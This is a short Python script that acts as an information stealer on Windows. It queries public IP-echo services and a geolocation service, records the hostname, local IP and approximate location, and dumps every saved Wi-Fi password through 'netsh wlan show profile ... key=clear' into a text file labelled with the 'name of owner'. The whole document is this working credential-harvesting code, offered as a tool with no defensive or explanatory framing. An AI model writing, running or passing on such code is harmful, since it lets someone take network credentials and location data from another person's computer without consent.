import socket
import subprocess
import urllib.request

IP_WEBSITES = ('https://ipinfo.io/ip',
           'https://ipecho.net/plain',
           'https://api.ipify.org',
           'https://ipaddr.site',
           'https://icanhazip.com',
           'https://ident.me',
           'https://curlmyip.net',)

def getIp():
    for ipWebsite in IP_WEBSITES:
        try:
            response = urllib.request.urlopen(ipWebsite)

            charsets = response.info().get_charsets()
            if len(charsets) == 0 or charsets[0] is None:
                charset = 'utf-8'  # Use utf-8 by default
            else:
                charset = charsets[0]

            userIp = response.read().decode(charset).strip()

            return userIp
        except:
            pass  # Network error, just continue on to next website.

    # Either all of the websites are down or returned invalid response
    # (unlikely) or you are disconnected from the internet.
    return None
loacition=f"https://geolocation-db.com/jsonp/{getIp()}"
def loc():
    try:
        response = urllib.request.urlopen(loacition)

        charsets = response.info().get_charsets()
        if len(charsets) == 0 or charsets[0] is None:
            charset = 'utf-8'  # Use utf-8 by default
        else:
            charset = charsets[0]

        userIp = response.read().decode(charset).strip()

        return userIp
    except:
        pass  # Network error, just continue on to next website.
x = loc().replace('"', "")
y=x.replace("'","")
zb=y.replace("callback","")
zd=zb.replace("{","")
zz=zd.replace("}","")
b=zz.replace(")","")
c=b.replace("(","")
hostname=socket.gethostname()
ip=socket.gethostbyname(hostname)
f = open(f"{hostname}.txt", "a")
f.write(f"name of owner: {hostname}\nip of network: {ip}\nip of device: {getIp()} \n"+c.replace(',','\n')+"\nwifi name||passwords:\n")
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        f.write("{:<30}|  {:<}".format(i, results[0])+"\n")

    except IndexError:
        f.write("{:<30}|  {:<}".format(i, "")+"\n")

f.close()

